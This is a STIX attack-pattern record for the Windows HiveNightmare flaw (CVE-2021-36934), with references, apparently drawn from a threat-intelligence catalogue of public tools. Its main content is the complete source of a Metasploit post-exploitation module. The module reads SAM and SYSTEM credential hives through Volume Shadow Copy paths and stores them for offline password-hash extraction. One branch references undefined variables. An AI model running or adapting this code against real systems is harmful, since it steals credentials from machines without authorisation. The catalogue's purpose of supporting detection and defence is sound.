{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--322eb7ed-80ab-48cc-b65e-b21e4a1b1210",
    "created": "2024-08-14T16:33:08.766143Z",
    "modified": "2024-08-14T16:33:08.766147Z",
    "name": "Windows SAM secrets leak - HiveNightmare",
    "description": " Due to mismanagement of SAM and SYSTEM hives in Windows 10, it is possible for an unprivileged user to read those files. But, as they are locked while Windows is running we are not able to read them directly. The trick is to take advantage of Volume Shadow Copy, which is generally enabled, to finally have a read access. Once SAM and SYSTEM files are successfully dumped and stored in `store_loot`, you can dump the hashes with some external scripts like secretsdump.py  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/windows_sam_hivenightmare.rb",
            "external_id": "windows_sam_hivenightmare.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-36934"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/GossiTheDog/HiveNightmare"
        },
        {
            "source_name": "reference",
            "url": "https://isc.sans.edu/diary/Summer+of+SAM+-+incorrect+permissions+on+Windows+1011+hives/27652"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/romarroca/SeriousSam"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows SAM secrets leak - HiveNightmare',\n        'Description' => %q{\n          Due to mismanagement of SAM and SYSTEM hives in Windows 10, it is possible for an unprivileged\n          user to read those files. But, as they are locked while Windows is running we are not able\n          to read them directly. The trick is to take advantage of Volume Shadow Copy, which is generally\n          enabled, to finally have a read access. Once SAM and SYSTEM files are successfully dumped and\n          stored in `store_loot`, you can dump the hashes with some external scripts like secretsdump.py\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Kevin Beaumont', # Discovery and original POC on www.github.com\n          'romarroca', # POC on www.github.com\n          'Yann Castel (yann.castel[at]orange.com)' # Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2021-36934'],\n          ['URL', 'https://github.com/GossiTheDog/HiveNightmare'],\n          ['URL', 'https://isc.sans.edu/diary/Summer+of+SAM+-+incorrect+permissions+on+Windows+1011+hives/27652'],\n          ['URL', 'https://github.com/romarroca/SeriousSam']\n        ],\n        'DisclosureDate' => '2021-07-20',\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Notes' => {\n          'AKA' => [ 'HiveNightmare', 'SeriousSAM' ],\n          'Reliability' => [ ],\n          'SideEffects' => [ ],\n          'Stability' => [ CRASH_SAFE ]\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n    register_options([\n      OptInt.new('ITERATIONS', [true, 'Number of iterations on Shadow Copy file index', 10]),\n      OptInt.new('FILE_INDEX', [false, 'Optional index parameter to retrieve a specific Shadow Copy file', nil])\n    ])\n  end\n\n  def check_path(path)\n    r = session.railgun.kernel32.CreateFileA(path, 'GENERIC_READ', 0x3, nil, 'OPEN_EXISTING', 'FILE_ATTRIBUTE_NORMAL', nil)\n    if r['GetLastError'] == 0\n      return r['return']\n    end\n\n    nil\n  end\n\n  def read_file(handle)\n    buffer_size = 100000\n\n    res_reading = client.railgun.kernel32.ReadFile(handle, buffer_size, buffer_size, 4, nil)\n    data = res_reading['lpBuffer'][0...res_reading['lpNumberOfBytesRead']]\n\n    while res_reading['lpNumberOfBytesRead'] == buffer_size\n      res_reading = client.railgun.kernel32.ReadFile(handle, buffer_size, buffer_size, 4, nil)\n      data += res_reading['lpBuffer'][0...res_reading['lpNumberOfBytesRead']]\n    end\n    client.railgun.kernel32.CloseHandle(handle)\n    data\n  end\n\n  def loot_files(sam_handle, index)\n    path = store_loot(\n      'windows.sam',\n      '',\n      session,\n      read_file(sam_handle)\n    )\n    print_good(\"SAM data saved at #{path}\")\n\n    handle = check_path(\"\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy#{index}\\\\Windows\\\\System32\\\\config\\\\SYSTEM\")\n    fail_with(Failure::UnexpectedReply, \"Can't open SYSTEM file!\") unless handle\n    path = store_loot(\n      'windows.system',\n      '',\n      session,\n      read_file(handle)\n    )\n    print_good(\"SYSTEM data saved at #{path}\")\n    print_good('SAM and SYSTEM data were leaked!')\n  end\n\n  def run\n    if datastore['FILE_INDEX']\n      fail_with(Failure::BadConfig, 'Please specify a non-negative file index!') unless datastore['FILE_INDEX'] >= 0\n\n      handle = check_path(\"\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy#{datastore['FILE_INDEX']}\\\\Windows\\\\System32\\\\config\\\\SAM\")\n      if handle\n        print_good(\"SAM data found in HarddiskVolumeShadowCopy#{i}!\")\n        print_good(\"Retrieving files of index #{index_most_recent_shadow_copy}...\")\n        loot_files(handle, datastore['FILE_INDEX'])\n      end\n    else\n      fail_with(Failure::BadConfig, 'Please specify an iteration number greater than 0!') unless datastore['ITERATIONS'] > 0\n\n      most_recent_time = nil\n      most_recent_shadow_copy = nil\n      index_most_recent_shadow_copy = -1\n\n      for i in 0..datastore['ITERATIONS']\n        handle = check_path(\"\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy#{i}\\\\Windows\\\\System32\\\\config\\\\SAM\")\n\n        next unless handle\n\n        print_good(\"SAM data found in HarddiskVolumeShadowCopy#{i}!\")\n        tmp_time = client.railgun.kernel32.GetFileTime(handle, 4, 4, 4)['lpLastWriteTime']\n\n        next unless (index_most_recent_shadow_copy == -1) || (client.railgun.kernel32.CompareFileTime(most_recent_time, tmp_time)['return'] < 0)\n\n        if most_recent_shadow_copy\n          client.railgun.kernel32.CloseHandle(most_recent_shadow_copy)\n        end\n\n        most_recent_time = tmp_time\n        most_recent_shadow_copy = handle\n        index_most_recent_shadow_copy = i\n      end\n\n      if index_most_recent_shadow_copy != -1\n        print_good(\"Retrieving files of index #{index_most_recent_shadow_copy} as they are the most recently modified...\")\n        loot_files(most_recent_shadow_copy, index_most_recent_shadow_copy)\n      else\n        print_error('No Shadow Copy files were found! Maybe you can try again with a greater iteration number...')\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-07-20",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}